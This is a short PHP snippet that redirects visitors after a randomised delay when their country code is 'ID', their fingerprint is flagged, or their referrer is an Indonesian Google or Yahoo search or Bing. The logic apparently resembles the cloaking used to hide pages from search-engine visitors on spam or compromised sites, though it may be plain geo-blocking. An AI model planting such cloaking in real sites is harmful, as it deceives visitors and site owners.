<?php

// Ensure variables exist
$cc = $cc ?? '';
$fingerprint = $fingerprint ?? '';
$rf = $rf ?? '';
$reff_url = $reff_url ?? '/';

if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
    usleep(rand(75000, 200000));
    http_response_code(307);
    header("Location: $reff_url");
    ob_end_flush();
    exit();
}

if (
    !empty($rf) &&
    (
        stripos($rf, "yahoo.co.id") !== false ||
        stripos($rf, "google.co.id") !== false ||
        stripos($rf, "bing.com") !== false
    )
) {
    usleep(rand(100000, 250000));
    http_response_code(307);
    header("Location: $reff_url");
    ob_end_flush();
    exit();
}

?>